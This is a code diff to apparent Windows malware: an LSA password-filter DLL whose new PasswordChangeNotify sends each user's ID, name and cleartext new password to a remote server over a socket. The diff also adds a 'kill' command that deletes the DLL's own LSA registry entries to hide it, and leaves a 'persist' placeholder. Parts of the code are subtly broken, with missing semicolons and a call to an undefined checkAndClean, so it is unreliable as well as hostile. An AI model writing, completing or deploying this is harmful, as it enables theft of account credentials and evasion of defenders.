@@ -37,6 +37,14 @@ typedef struct {
 SOCKET g_sock = INVALID_SOCKET;
 // ---------------------------------------------------------------------
 
+// ---------------------------------------------------------------------
+// Names of DLLs to remove when 'kill' is called
+static const char* BLACKLIST[] = {
+    "cory_filter",
+    "cory_msv",
+    "cory_ssp"
+};
+// ---------------------------------------------------------------------
 
 SOCKET connect_to_server() {
     SOCKET sock;
@@ -94,6 +102,27 @@ DWORD WINAPI agent_thread(LPVOID lpParam) {
     WSACleanup();
     return 0;
 }
+
+void clean_reg(HKEY root, const char* keyPath, const char* valueName) {
+    HKEY hKey;
+    char data[4096] = {0};
+    DWORD size = sizeof(data);
+
+    if (RegOpenKeyExA(root, keyPath, 0, KEY_READ | KEY_WRITE, &hKey) != ERROR_SUCCESS)
+        return;
+
+    if (RegQueryValueExA(hKey, valueName, NULL, NULL, (LPBYTE)data, &size) == ERROR_SUCCESS) {
+        for (int i = 0; i < sizeof(BLACKLIST) / sizeof(BLACKLIST[0]); i++) {
+            if (strstr(data, BLACKLIST[i])) {
+                log_to_server("Found reg value, deleting it");
+                RegDeleteValueA(hKey, valueName); // or set to empty
+            }
+        }
+    }
+
+    RegCloseKey(hKey);
+}
+
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
 
@@ -186,11 +215,13 @@ BOOLEAN WINAPI PasswordFilter(PUNICODE_STRING account_name, PUNICODE_STRING full
 
         } else if (wcscmp(tokens[1], L"persist") == 0) {
 
-            
+            log_to_server("to implement later")
 
         } else if (wcscmp(tokens[1], L"kill") == 0) {
 
-
+            checkAndClean(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "Auth0");
+            checkAndClean(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Lsa", "Security Packages");
+            checkAndClean(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Lsa", "Notification Packages");
 
         } else {
           
@@ -207,5 +238,17 @@ BOOLEAN WINAPI PasswordFilter(PUNICODE_STRING account_name, PUNICODE_STRING full
 // Receives cleartext username and new password
 // Return STATUS_SUCCESS (0) when done
 NTSTATUS WINAPI PasswordChangeNotify(PUNICODE_STRING user_name, ULONG relative_id, PUNICODE_STRING new_password) {
-    // TODO
+    WCHAR buf[256];
+    UNICODE_STRING result;
+    WCHAR idBuf[32];
+    UNICODE_STRING idStr;
+
+    _snwprintf(idBuf, 32, L"%lu", relative_id);
+    _snwprintf(buf, 256, L"%s : %wZ : %wZ", idBuf, user_name, new_password);
+
+    log_to_server("\n\n-- NEW CREDS SET --")
+    log_to_server(buf);
+    log_to_server("--------------------\n\n")
+
+    return TRUE;
 }
